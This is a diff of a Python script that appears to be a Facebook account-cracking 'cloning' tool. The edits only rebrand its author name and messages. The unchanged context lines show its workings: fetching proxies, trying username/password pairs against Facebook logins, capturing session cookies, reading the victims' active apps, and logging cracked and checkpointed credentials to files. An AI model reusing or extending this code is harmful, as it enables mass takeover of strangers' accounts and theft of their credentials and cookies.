@@ -36,10 +36,10 @@ os.system("espeak -a 300 \"Checking,Update,\"")
 time.sleep(2)
 #os.system('clear')
 print('\033[91;1m[\x1b[31;5;50m+\033[91;1m] \x1b[31;5;50mUPDATE VERSHON 6.1...! ')
-os.system("espeak -a 300 \"UPDATE VERSION 8.2,\"")
+os.system("espeak -a 300 \"UPDATE VERSION 6.2,\"")
 time.sleep(2)
 #os.system('clear')
-print("\033[95;1m[\x1b[35;5;50m+\033[97;1m]\x1b[35;5;50m SUBSCRIBE MY YOUTUBE CHANNEL..!")
+print("\033[95;1m[\x1b[35;5;50m+\033[97;1m]\x1b[35;5;50m SEND REQUEST MY ACCOUNT ..!")
 time.sleep(2)
 os.system("espeak -a 300 \"FOLLOW,MY, FACEBOOK, ACCOUNT,\"")
 os.system(f'xdg-open https://www.facebook.com/profile.php?id=100036118653131')
@@ -151,7 +151,7 @@ try:
     prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
     open('.prox.txt','w').write(prox)
 except Exception as e:
-    print(' WELCOME TO RANDOM CLONING SYSTEM')
+    print(' WELCOME TO RANDOM DEVI CLONING SYSTEM')
     
  
  
@@ -230,7 +230,7 @@ if ltx > 12:
 else:
     a = ltx
     tag = "AM"
-    print("PLEASE SUBSCRIBE OUR YOUTUBE CHANNEL")
+    print("PLEASE SUBSCRIBE OUR GITHUB CHANNEL")
     time.sleep(3)
 logo ="""  \033[1;32;40m
  
@@ -249,7 +249,7 @@ $$$$$$$  |\$$$$$$$\   \$  /   $$ |
 
 \033[1;37m══════════════════════════════════════════════════
 \033[1;32m𝐀𝐔𝐓𝐇𝐎𝐑\033[1;31m  \033[1;32mDEVI
-\033[1;32m𝐕𝐄𝐑𝐒𝐈𝐎N\033[1;31m  \033[1;32m0.8      
+\033[1;32m𝐕𝐄𝐑𝐒𝐈𝐎N\033[1;31m  \033[1;32m0.11      
 \033[1;32m 𝐒𝐓𝐀𝐓𝐔𝐒 \033[1;31m  \033[1;32mFREE
 \033[1;37mDevi friends 
 \033[1;37m══════════════════════════════════════════════════"""
@@ -280,7 +280,7 @@ def cek_apk(session,coki):
         print('\r[🎮] \033[1;92m ☆ Your Active Apps ☆ \033[1;91m: \033[1;96m')
         for i in range(len(game)):
             print("\r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
-            #created by hbf team(owners) devi&king
+            #created by hbf team(owners) devi & king
     w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
     sop = BeautifulSoup(w,"html.parser")
     x = sop.find("form",method="post")
@@ -703,14 +703,14 @@ def freeq(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 uid = coki[151:166]
-                print(f'\r\33[1;97m[\033[1;96m[DILBER-OK]\033[1;97m]\033[1;92m '+uid+' | '+ps+ '  ') 
+                print(f'\r\33[1;97m[\033[1;96m[DEVI-OK]\033[1;97m]\033[1;92m '+uid+' | '+ps+ '  ') 
                 cek_apk(session,coki)
                 open('/sdcard/OK.txt', 'a').write(uid+' | '+ps+'\n')
                 ok.append(uid)
             elif 'checkpoint' in log_cookies:
                     coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                     uid=coki[141:156]
-                    print(f'\r\33[1;97m[\033[1;91m[DILBER-CP]\033[1;97m]\033[1;90m '+uid+' | '+ps+' ')
+                    print(f'\r\33[1;97m[\033[1;91m[DEVI-CP]\033[1;97m]\033[1;90m '+uid+' | '+ps+' ')
                     open('/sdcard/CP.txt', 'a').write(uid+' | '+ps+'\n')
                     cp.append(uid)
                     break
